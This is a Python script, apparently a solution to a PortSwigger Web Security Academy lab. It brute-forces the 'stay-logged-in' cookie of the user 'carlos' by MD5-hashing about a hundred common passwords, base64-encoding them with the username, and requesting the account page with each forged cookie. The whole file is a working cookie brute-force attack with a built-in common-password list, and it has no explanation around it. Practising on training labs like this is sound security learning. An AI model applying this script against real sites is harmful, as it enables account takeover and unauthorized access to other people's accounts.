import base64
import requests
import hashlib

url = "https://0a6e00fb04d9ad1a817d625000fc00e3.web-security-academy.net/my-account?id=carlos"

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]

# Function to compute MD5 hash of a string
def calculate_md5(input_string):
    # Convert the input string to bytes
    input_bytes = input_string.encode('utf-8')

    # Create an MD5 hash object
    md5_hash = hashlib.md5()

    # Update hash object with the bytes of the input string
    md5_hash.update(input_bytes)

    # Get the hexadecimal representation of the hash digest
    md5_digest = md5_hash.hexdigest()
    return md5_digest


# Function to encode a string to base64
def encode_to_base64(input_string):
    # Convert the input string to bytes
    input_bytes = input_string.encode('utf-8')

    # Encode bytes to base64
    base64_bytes = base64.b64encode(input_bytes)

    # Convert bytes back to a string (in Python 3, base64.b64encode() returns bytes)
    base64_string = base64_bytes.decode('utf-8')

    return base64_string

for password in passwords:
    passMd5 =calculate_md5(password)
    stay_logged = encode_to_base64(f"carlos:{passMd5}")
    cookies = {
        "stay-logged-in":stay_logged
    }
    response = requests.get(url=url,cookies=cookies)
    print(response.status_code)
